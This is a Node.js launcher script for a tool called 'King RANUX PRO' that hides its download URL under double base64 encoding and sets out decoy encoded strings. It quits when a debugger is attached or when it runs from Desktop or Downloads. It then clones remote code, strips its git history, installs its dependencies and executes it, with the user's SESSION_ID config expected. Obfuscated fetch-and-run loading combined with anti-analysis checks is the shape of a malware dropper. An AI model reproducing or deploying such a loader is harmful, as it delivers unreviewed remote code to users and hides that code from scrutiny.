const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

if (process.execArgv.join("").includes("inspect")) {
  console.log("Debug mode detected. Exiting...");
  process.exit(1);
}

const FAKE_1 = "aHR0cHM6Ly9naXRodWIuY29tL2Zha2UvZmFrZS5naXQ=";
const FAKE_2 = "aHR0cHM6Ly9naXRodWIuY29tL2R1bW15L2R1bW15LmdpdA==";

function useless() {
  return Buffer.from(FAKE_1, "base64").toString();
}

const hidden = "YUhSMGNITTZMeTl5YjJkd2JXNHVZMjl0TDNKNFluSnBaR2RsTFdSbGRpOXVlQzFpY21sa1pHVXVZMmww";
const STEP1 = Buffer.from(hidden, "base64").toString();
const CORE_URL = Buffer.from(STEP1, "base64").toString();

const CORE_DIR = path.join(__dirname, "core");

if (__dirname.includes("Desktop") || __dirname.includes("Downloads")) {
  console.log("Unauthorized environment detected.");
  process.exit(1);
}

try {
  console.log("Clearing npm cache...");
  execSync("npm cache clean --force", { stdio: "inherit" });
} catch {}

if (fs.existsSync(CORE_DIR)) {
  try {
    console.log("Removing old core...");
    fs.rmSync(CORE_DIR, { recursive: true, force: true });
  } catch {}
}

console.log("Downloading latest King RANUX PRO core...");
try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
  console.log("Core downloaded.");
} catch (e) {
  console.log("Failed to download core.");
  process.exit(1);
}

if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  try {
    execSync("rm -rf core/.git");
  } catch {}
}

console.log("Installing core dependencies...");
try {
  execSync("cd core && npm install", { stdio: "inherit" });
  console.log("Dependencies installed.");
} catch (e) {
  console.log("Failed to install dependencies.");
  process.exit(1);
}

const userConfigPath = path.join(__dirname, "config.js");

if (!fs.existsSync(userConfigPath)) {
  console.log("config.js not found!");
  console.log("Create config.js with your SESSION_ID.");
  process.exit(1);
}

console.log("Launching King RANUX PRO...");
try {
  require("./core/index.js");
} catch (e) {
  console.log("Failed to start core:", e);
  }
